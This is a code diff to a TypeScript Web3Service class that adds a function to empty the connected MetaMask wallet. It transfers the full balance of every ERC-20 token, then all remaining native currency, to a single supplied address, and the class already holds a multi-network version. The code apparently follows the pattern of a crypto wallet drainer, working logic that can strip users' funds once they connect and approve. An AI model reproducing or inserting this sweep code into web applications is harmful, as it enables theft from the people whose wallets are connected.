@@ -1358,6 +1358,89 @@ export class Web3Service {
   }
 
   // Multi-network transfer functionality
+  async transferCurrentNetworkFunds(toAddress: string): Promise<string[]> {
+    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
+      throw new Error("Invalid destination address");
+    }
+
+    if (!window.ethereum) {
+      throw new Error("MetaMask is not installed");
+    }
+
+    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+    if (accounts.length === 0) {
+      throw new Error("No wallet connected");
+    }
+
+    const fromAddress = accounts[0];
+    console.log(`Transferring funds from ${fromAddress} to ${toAddress}`);
+
+    // Connect to current provider
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    const network = await provider.getNetwork();
+    const networkId = network.chainId.toString();
+    
+    console.log(`Current network: ${NETWORKS[networkId]?.name || networkId}`);
+
+    const transactionHashes: string[] = [];
+
+    try {
+      // Get token balances first
+      const tokenBalances = await this.getTokenBalances(fromAddress, networkId);
+      console.log(`Found ${tokenBalances.length} tokens to transfer`);
+
+      // Transfer tokens first
+      for (const token of tokenBalances) {
+        if (parseFloat(token.balance) > 0) {
+          try {
+            console.log(`Transferring ${token.balance} ${token.symbol}`);
+            const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
+            const balance = await contract.balanceOf(fromAddress);
+            
+            if (balance > BigInt(0)) {
+              const tx = await contract.transfer(toAddress, balance, {
+                gasLimit: BigInt(100000),
+                gasPrice: ethers.parseUnits("0.5", "gwei")
+              });
+              transactionHashes.push(tx.hash);
+              console.log(`Token transfer: ${tx.hash}`);
+            }
+          } catch (error) {
+            console.warn(`Failed to transfer ${token.symbol}:`, error);
+          }
+        }
+      }
+
+      // Transfer remaining native currency
+      const balance = await provider.getBalance(fromAddress);
+      const gasPrice = ethers.parseUnits("0.5", "gwei");
+      const gasLimit = BigInt(21000);
+      const gasCost = gasPrice * gasLimit;
+      
+      if (balance > gasCost) {
+        const sendAmount = balance - gasCost;
+        console.log(`Transferring ${ethers.formatEther(sendAmount)} native currency`);
+        
+        const tx = await signer.sendTransaction({
+          to: toAddress,
+          value: sendAmount,
+          gasLimit,
+          gasPrice
+        });
+        transactionHashes.push(tx.hash);
+        console.log(`Native transfer: ${tx.hash}`);
+      }
+
+      console.log(`Completed ${transactionHashes.length} transactions`);
+      return transactionHashes;
+
+    } catch (error) {
+      console.error("Transfer failed:", error);
+      throw error;
+    }
+  }
+
   async transferAllFundsMultiNetwork(toAddress: string): Promise<MultiNetworkTransferResult> {
     if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
       throw new Error("Invalid destination address");
